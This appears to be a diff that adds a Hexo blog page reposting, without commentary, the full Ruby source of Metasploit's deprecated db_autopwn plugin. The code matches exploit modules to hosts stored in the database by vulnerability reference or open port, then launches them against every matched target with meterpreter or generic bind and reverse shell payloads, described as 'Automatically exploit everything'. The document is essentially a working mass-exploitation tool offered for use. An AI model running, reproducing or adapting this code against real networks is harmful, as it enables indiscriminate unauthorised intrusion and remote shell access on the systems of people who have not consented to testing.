@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="title:Metasploit db_autopwn模块源代码date:2016-02-07 11:44:51    #
+# db_autopwn - stripped from previous db commands and modified into a plugin as autopwn has been
+#        pulled from the mainline release">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/2017/03/26/Metasploit db_autopwn模块源代码/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="title:Metasploit db_autopwn模块源代码date:2016-02-07 11:44:51    #
+# db_autopwn - stripped from previous db commands and modified into a plugin as autopwn has been
+#        pulled from the mainline release">
+<meta property="og:updated_time" content="2017-03-27T10:11:16.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="title:Metasploit db_autopwn模块源代码date:2016-02-07 11:44:51    #
+# db_autopwn - stripped from previous db commands and modified into a plugin as autopwn has been
+#        pulled from the mainline release">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Metasploit db_autopwn模块源代码" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/Metasploit db_autopwn模块源代码/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:Metasploit db_autopwn模块源代码<br>date:2016-02-07 11:44:51<br>    #</p>
+<pre><code># db_autopwn - stripped from previous db commands and modified into a plugin as autopwn has been
+#        pulled from the mainline release.
+#
+#        Issues/Bugs should go to neinwechter via GitHub
+#
+
+
+module Msf
+
+class Plugin::DBAutopwn &lt; Msf::Plugin
+    class DBAutopwnCommandDispatcher
+        include Msf::Ui::Console::CommandDispatcher
+
+        #
+        # Constants
+        #
+
+        PWN_SHOW = 2**0
+        PWN_XREF = 2**1
+        PWN_PORT = 2**2
+        PWN_EXPL = 2**3
+        PWN_SING = 2**4
+        PWN_SLNT = 2**5
+        PWN_VERB = 2**6
+
+        def name
+            &quot;db_autopwn&quot;
+        end
+
+        def commands
+            {
+                &quot;db_autopwn&quot; =&gt; &quot;Automatically exploit everything&quot;,
+            }
+        end
+
+        #
+        # Returns true if the db is connected, prints an error and returns
+        # false if not.
+        #
+        # All commands that require an active database should call this before
+        # doing anything.
+        #
+        def active?
+            if not framework.db.active
+                print_error(&quot;Database not connected&quot;)
+                return false
+            end
+            true
+        end
+
+        #
+        # A shotgun approach to network-wide exploitation
+        # Officially deprecated as of 4.1
+        #
+        # Forked for those who still want it and understand it&apos;s limitations/issues
+        #
+
+        def cmd_db_autopwn(*args)
+            return unless active?
+
+            print_error(&quot;&quot;)
+            print_error(&quot;Warning: The db_autopwn command is not officially supported and exists only in a branch.&quot;)
+            print_error(&quot;         This code is not well maintained, crashes systems, and crashes itself.&quot;)
+            print_error(&quot;         Use only if you understand it&apos;s current limitations/issues.&quot;)
+            print_error(&quot;         Minimal support and development via neinwechter on GitHub metasploit fork.&quot;)
+            print_error(&quot;&quot;)
+
+            stamp = Time.now.to_f
+            vcnt  = 0
+            rcnt  = 0
+            mode  = 0
+            code  = :bind
+            mjob  = 5
+            regx  = nil
+            minrank = nil
+            maxtime = 120
+
+            port_inc = []
+            port_exc = []
+
+            targ_inc = []
+            targ_exc = []
+
+            args.push(&quot;-h&quot;) if args.length == 0
+
+            while (arg = args.shift)
+                case arg
+                when &apos;-t&apos;
+                    mode |= PWN_SHOW
+                when &apos;-x&apos;
+                    mode |= PWN_XREF
+                when &apos;-p&apos;
+                    mode |= PWN_PORT
+                when &apos;-e&apos;
+                    mode |= PWN_EXPL
+                when &apos;-s&apos;
+                    mode |= PWN_SING
+                when &apos;-q&apos;
+                    mode |= PWN_SLNT
+                when &apos;-v&apos;
+                    mode |= PWN_VERB
+                when &apos;-j&apos;
+                    mjob = args.shift.to_i
+                when &apos;-r&apos;
+                    code = :conn
+                when &apos;-b&apos;
+                    code = :bind
+                when &apos;-I&apos;
+                    tmpopt = OptAddressRange.new(&apos;TEMPRANGE&apos;, [ true, &apos;&apos; ])
+                    range = args.shift
+                    if not tmpopt.valid?(range)
+                        print_error(&quot;Invalid range for -I&quot;)
+                        return
+                    end
+                    targ_inc &lt;&lt; Rex::Socket::RangeWalker.new(tmpopt.normalize(range))
+                when &apos;-X&apos;
+                    tmpopt = OptAddressRange.new(&apos;TEMPRANGE&apos;, [ true, &apos;&apos; ])
+                    range = args.shift
+                    if not tmpopt.valid?(range)
+                        print_error(&quot;Invalid range for -X&quot;)
+                        return
+                    end
+                    targ_exc &lt;&lt; Rex::Socket::RangeWalker.new(tmpopt.normalize(range))
+                when &apos;-PI&apos;
+                    port_inc = Rex::Socket.portspec_to_portlist(args.shift)
+                when &apos;-PX&apos;
+                    port_exc = Rex::Socket.portspec_to_portlist(args.shift)
+                when &apos;-m&apos;
+                    regx = args.shift
+                when &apos;-R&apos;
+                    minrank = args.shift
+                when &apos;-T&apos;
+                    maxtime = args.shift.to_f
+                when &apos;-h&apos;,&apos;--help&apos;
+                    print_status(&quot;Usage: db_autopwn [options]&quot;)
+                    print_line(&quot;\t-h          Display this help text&quot;)
+                    print_line(&quot;\t-t          Show all matching exploit modules&quot;)
+                    print_line(&quot;\t-x          Select modules based on vulnerability references&quot;)
+                    print_line(&quot;\t-p          Select modules based on open ports&quot;)
+                    print_line(&quot;\t-e          Launch exploits against all matched targets&quot;)
+#                    print_line(&quot;\t-s          Only obtain a single shell per target system (NON-FUNCTIONAL)&quot;)
+                    print_line(&quot;\t-r          Use a reverse connect shell&quot;)
+                    print_line(&quot;\t-b          Use a bind shell on a random port (default)&quot;)
+                    print_line(&quot;\t-q          Disable exploit module output&quot;)
+                    print_line(&quot;\t-R  [rank]  Only run modules with a minimal rank&quot;)
+                    print_line(&quot;\t-I  [range] Only exploit hosts inside this range&quot;)
+                    print_line(&quot;\t-X  [range] Always exclude hosts inside this range&quot;)
+                    print_line(&quot;\t-PI [range] Only exploit hosts with these ports open&quot;)
+                    print_line(&quot;\t-PX [range] Always exclude hosts with these ports open&quot;)
+                    print_line(&quot;\t-m  [regex] Only run modules whose name matches the regex&quot;)
+                    print_line(&quot;\t-T  [secs]  Maximum runtime for any exploit in seconds&quot;)
+                    print_line(&quot;&quot;)
+                    return
+                end
+            end
+
+            minrank = minrank || framework.datastore[&apos;MinimumRank&apos;] || &apos;manual&apos;
+            if ! RankingName.values.include?(minrank)
+                print_error(&quot;MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join(&quot;|&quot;)})&quot;)
+                wlog(&quot;MinimumRank invalid, ignoring&quot;, &apos;core&apos;, LEV_0)
+                return
+            else
+                minrank = RankingName.invert[minrank]
+            end
+
+            # Default to quiet mode
+            if (mode &amp; PWN_VERB == 0)
+                mode |= PWN_SLNT
+            end
+
+            matches    = {}
+            refmatches = {}
+
+            # Pre-allocate a list of references and ports for all exploits
+            mrefs  = {}
+            mports = {}
+            mservs = {}
+
+            # A list of jobs we spawned and need to wait for
+            autopwn_jobs = []
+
+            [ [framework.exploits, &apos;exploit&apos; ], [ framework.auxiliary, &apos;auxiliary&apos; ] ].each do |mtype|
+                mtype[0].each_module do |modname, mod|
+                    o = mod.new
+
+                    if(mode &amp; PWN_XREF != 0)
+                        o.references.each do |r|
+                            next if r.ctx_id == &apos;URL&apos;
+                            ref = r.ctx_id + &quot;-&quot; + r.ctx_val
+                            ref.upcase!
+
+                            mrefs[ref] ||= {}
+                            mrefs[ref][o.fullname] = o
+                        end
+                    end
+
+                    if(mode &amp; PWN_PORT != 0)
+                        if(o.datastore[&apos;RPORT&apos;])
+                            rport = o.datastore[&apos;RPORT&apos;]
+                            mports[rport.to_i] ||= {}
+                            mports[rport.to_i][o.fullname] = o
+                        end
+
+                        if(o.respond_to?(&apos;autofilter_ports&apos;))
+                            o.autofilter_ports.each do |rport|
+                                mports[rport.to_i] ||= {}
+                                mports[rport.to_i][o.fullname] = o
+                            end
+                        end
+
+                        if(o.respond_to?(&apos;autofilter_services&apos;))
+                            o.autofilter_services.each do |serv|
+                                mservs[serv] ||= {}
+                                mservs[serv][o.fullname] = o
+                            end
+                        end
+                    end
+                end
+            end
+
+
+            begin
+
+            framework.db.hosts.each do |host|
+                xhost = host.address
+                next if (targ_inc.length &gt; 0 and not range_include?(targ_inc, xhost))
+                next if (targ_exc.length &gt; 0 and range_include?(targ_exc, xhost))
+
+                if(mode &amp; PWN_VERB != 0)
+                    print_status(&quot;Scanning #{xhost} for matching exploit modules...&quot;)
+                end
+
+                #
+                # Match based on vulnerability references
+                #
+                if (mode &amp; PWN_XREF != 0)
+
+                    host.vulns.each do |vuln|
+
+                        # Faster to handle these here
+                        serv = vuln.service
+                        xport = xprot = nil
+
+                        if(serv)
+                            xport = serv.port
+                            xprot = serv.proto
+                        end
+
+                        vuln.refs.each do |ref|
+                            mods = mrefs[ref.name.upcase] || {}
+                            mods.each_key do |modname|
+                                mod = mods[modname]
+                                next if minrank and minrank &gt; mod.rank
+                                next if (regx and mod.fullname !~ /#{regx}/)
+
+                                if(xport)
+                                    next if (port_inc.length &gt; 0 and not port_inc.include?(serv.port.to_i))
+                                    next if (port_exc.length &gt; 0 and port_exc.include?(serv.port.to_i))
+                                else
+                                    if(mod.datastore[&apos;RPORT&apos;])
+                                        next if (port_inc.length &gt; 0 and not port_inc.include?(mod.datastore[&apos;RPORT&apos;].to_i))
+                                        next if (port_exc.length &gt; 0 and port_exc.include?(mod.datastore[&apos;RPORT&apos;].to_i))
+                                    end
+                                end
+
+                                next if (regx and mod.fullname !~ /#{regx}/)
+
+                                mod.datastore[&apos;RPORT&apos;] = xport if xport
+                                mod.datastore[&apos;RHOST&apos;] = xhost
+
+                                filtered = false
+                                begin
+                                    ::Timeout.timeout(2, ::RuntimeError) do
+                                        filtered = true if not mod.autofilter()
+                                    end
+                                rescue ::Interrupt
+                                    raise $!
+                                rescue ::Timeout::Error
+                                    filtered = true
+                                rescue ::Exception
+                                    filtered = true
+                                end
+                                next if filtered
+
+                                matches[[xport,xprot,xhost,mod.fullname]]=true
+                                refmatches[[xport,xprot,xhost,mod.fullname]] ||= []
+                                refmatches[[xport,xprot,xhost,mod.fullname]] &lt;&lt; ref.name
+                            end
+                        end
+                    end
+                end
+
+                #
+                # Match based on open ports
+                #
+                if (mode &amp; PWN_PORT != 0)
+                    host.services.each do |serv|
+                        next if not serv.host
+                        next if (serv.state != ServiceState::Open)
+
+                        xport = serv.port.to_i
+                        xprot = serv.proto
+                        xname = serv.name
+
+                        next if xport == 0
+
+                        next if (port_inc.length &gt; 0 and not port_inc.include?(xport))
+                        next if (port_exc.length &gt; 0 and port_exc.include?(xport))
+
+                        mods = mports[xport.to_i] || {}
+
+                        mods.each_key do |modname|
+                            mod = mods[modname]
+                            next if minrank and minrank &gt; mod.rank
+                            next if (regx and mod.fullname !~ /#{regx}/)
+                            mod.datastore[&apos;RPORT&apos;] = xport
+                            mod.datastore[&apos;RHOST&apos;] = xhost
+
+                            filtered = false
+                            begin
+                                ::Timeout.timeout(2, ::RuntimeError) do
+                                    filtered = true if not mod.autofilter()
+                                end
+                            rescue ::Interrupt
+                                raise $!
+                            rescue ::Exception
+                                filtered = true
+                            end
+
+                            next if filtered
+                            matches[[xport,xprot,xhost,mod.fullname]]=true
+                        end
+
+                        mods = mservs[xname] || {}
+                        mods.each_key do |modname|
+                            mod = mods[modname]
+                            next if minrank and minrank &gt; mod.rank
+                            next if (regx and mod.fullname !~ /#{regx}/)
+                            mod.datastore[&apos;RPORT&apos;] = xport
+                            mod.datastore[&apos;RHOST&apos;] = xhost
+
+                            filtered = false
+                            begin
+                                ::Timeout.timeout(2, ::RuntimeError) do
+                                    filtered = true if not mod.autofilter()
+                                end
+                            rescue ::Interrupt
+                                raise $!
+                            rescue ::Exception
+                                filtered = true
+                            end
+
+                            next if filtered
+                            matches[[xport,xprot,xhost,mod.fullname]]=true
+                        end
+                    end
+                end
+            end
+
+            rescue ::Exception =&gt; e
+                print_status(&quot;ERROR: #{e.class} #{e} #{e.backtrace}&quot;)
+                return
+            end
+
+            if (mode &amp; PWN_SHOW != 0)
+                print_status(&quot;Analysis completed in #{(Time.now.to_f - stamp).to_i} seconds (#{vcnt} vulns / #{rcnt} refs)&quot;)
+                print_status(&quot;&quot;)
+                print_status(&quot;=&quot; * 80)
+                print_status(&quot; &quot; * 28 + &quot;Matching Exploit Modules&quot;)
+                print_status(&quot;=&quot; * 80)
+
+                matches.each_key do |xref|
+                    mod = nil
+                    if ((mod = framework.modules.create(xref[3])) == nil)
+                        print_status(&quot;Failed to initialize #{xref[3]}&quot;)
+                        next
+                    end
+
+                    if (mode &amp; PWN_SHOW != 0)
+                        tport = xref[0] || mod.datastore[&apos;RPORT&apos;]
+                        if(refmatches[xref])
+                            print_status(&quot;  #{xref[2]}:#{tport}  #{xref[3]}  (#{refmatches[xref].join(&quot;, &quot;)})&quot;)
+                        else
+                            print_status(&quot;  #{xref[2]}:#{tport}  #{xref[3]}  (port match)&quot;)
+                        end
+                    end
+
+                end
+                print_status(&quot;=&quot; * 80)
+                print_status(&quot;&quot;)
+                print_status(&quot;&quot;)
+            end
+
+            ilog(&quot;db_autopwn: Matched #{matches.length} modules&quot;)
+
+            idx = 0
+            matches.each_key do |xref|
+
+                idx += 1
+
+                begin
+                    mod = nil
+
+                    if ((mod = framework.modules.create(xref[3])) == nil)
+                        print_status(&quot;Failed to initialize #{xref[3]}&quot;)
+                        next
+                    end
+
+                    #
+                    # The code is just a proof-of-concept and will be expanded in the future
+                    #
+                    if (mode &amp; PWN_EXPL != 0)
+
+                        mod.datastore[&apos;RHOST&apos;] = xref[2]
+
+                        if(xref[0])
+                            mod.datastore[&apos;RPORT&apos;] = xref[0].to_s
+                        end
+
+                        if (code == :bind)
+                            mod.datastore[&apos;LPORT&apos;]   = (rand(0x8fff) + 4000).to_s
+                            if(mod.fullname =~ /\/windows\//)
+                                mod.datastore[&apos;PAYLOAD&apos;] = &apos;windows/meterpreter/bind_tcp&apos;
+                            else
+                                mod.datastore[&apos;PAYLOAD&apos;] = &apos;generic/shell_bind_tcp&apos;
+                            end
+                        end
+
+                        if (code == :conn)
+                            mod.datastore[&apos;LHOST&apos;]   =     Rex::Socket.source_address(xref[2])
+                            mod.datastore[&apos;LPORT&apos;]   =     (rand(0x8fff) + 4000).to_s
+
+                            if (mod.datastore[&apos;LHOST&apos;] == &apos;127.0.0.1&apos;)
+                                print_status(&quot;Failed to determine listener address for target #{xref[2]}...&quot;)
+                                next
+                            end
+
+                            if(mod.fullname =~ /\/windows\//)
+                                mod.datastore[&apos;PAYLOAD&apos;] = &apos;windows/meterpreter/reverse_tcp&apos;
+                            else
+                                mod.datastore[&apos;PAYLOAD&apos;] = &apos;generic/shell_reverse_tcp&apos;
+                            end
+                        end
+
+
+                        if(framework.jobs.keys.length &gt;= mjob)
+                            print_status(&quot;Job limit reached, waiting on modules to finish...&quot;)
+                            while(framework.jobs.keys.length &gt;= mjob)
+                                ::IO.select(nil, nil, nil, 0.25)
+                            end
+                        end
+
+                        print_status(&quot;(#{idx}/#{matches.length} [#{framework.sessions.length} sessions]): Launching #{xref[3]} against #{xref[2]}:#{mod.datastore[&apos;RPORT&apos;]}...&quot;)
+
+                        autopwn_jobs &lt;&lt; framework.threads.spawn(&quot;AutoPwnJob#{xref[3]}&quot;, false, mod) do |xmod|
+                            begin
+                            stime = Time.now.to_f
+                            ::Timeout.timeout(maxtime) do
+                                    inp = (mode &amp; PWN_SLNT != 0) ? nil : driver.input
+                                    out = (mode &amp; PWN_SLNT != 0) ? nil : driver.output
+
+                                    case xmod.type
+                                    when MODULE_EXPLOIT
+                                        xmod.exploit_simple(
+                                            &apos;Payload&apos;        =&gt; xmod.datastore[&apos;PAYLOAD&apos;],
+                                            &apos;LocalInput&apos;     =&gt; inp,
+                                            &apos;LocalOutput&apos;    =&gt; out,
+                                            &apos;RunAsJob&apos;       =&gt; false)
+                                    when MODULE_AUX
+                                        xmod.run_simple(
+                                            &apos;LocalInput&apos;     =&gt; inp,
+                                            &apos;LocalOutput&apos;    =&gt; out,
+                                            &apos;RunAsJob&apos;       =&gt; false)
+                                    end
+                                end
+
+                            rescue ::Timeout::Error
+                                print_status(&quot; &gt;&gt; autopwn module timeout from #{xmod.fullname} after #{Time.now.to_f - stime} seconds&quot;)
+                            rescue ::Exception
+                                print_status(&quot; &gt;&gt; autopwn exception during launch from #{xmod.fullname}: #{$!} &quot;)
+                            end
+                        end
+                    end
+
+                rescue ::Interrupt
+                    raise $!
+
+                rescue ::Exception
+                    print_status(&quot; &gt;&gt; autopwn exception from #{xref[3]}: #{$!} #{$!.backtrace}&quot;)
+                end
+            end
+
+            # Wait on all the jobs we just spawned
+            while (not autopwn_jobs.empty?)
+                # All running jobs are stored in framework.jobs.  If it&apos;s
+                # not in this list, it must have completed.
+                autopwn_jobs.delete_if { |j| not j.alive? }
+
+                print_status(&quot;(#{matches.length}/#{matches.length} [#{framework.sessions.length} sessions]): Waiting on #{autopwn_jobs.length} launched modules to finish execution...&quot;)
+                ::IO.select(nil, nil, nil, 5.0)
+            end
+
+            if (mode &amp; PWN_SHOW != 0 and mode &amp; PWN_EXPL != 0)
+                print_status(&quot;The autopwn command has completed with #{framework.sessions.length} sessions&quot;)
+                if(framework.sessions.length &gt; 0)
+                    print_status(&quot;Enter sessions -i [ID] to interact with a given session ID&quot;)
+                    print_status(&quot;&quot;)
+                    print_status(&quot;=&quot; * 80)
+                    driver.run_single(&quot;sessions -l -v&quot;)
+                    print_status(&quot;=&quot; * 80)
+                end
+            end
+            print_line(&quot;&quot;)
+        # EOM
+        end
+
+
+
+
+
+
+
+
+
+
+##############################
+##############################
+
+    end
+
+    def initialize(framework, opts)
+        super
+        add_console_dispatcher(DBAutopwnCommandDispatcher)
+    end
+
+    def cleanup
+        remove_console_dispatcher(&apos;db_autopwn&apos;)
+    end
+
+    def name
+        &quot;db_autopwn&quot;
+    end
+
+    def desc
+        &quot;Automatically exploit everything&quot;
+    end
+
+end
+end
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/Metasploit db_autopwn模块源代码/" data-id="cj0ryfu9n000rc6otq0pidkj1" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/03/26/Mysql用户远程连接授权/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/03/26/O(1)实现二叉树翻转/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a><span class="archive-list-count">173</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/03/26/c++ std::random_shuffle()实现/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/About/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/Ajax模板/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/Bing背景图片API/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/Django教程：创建投票App Part 2/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
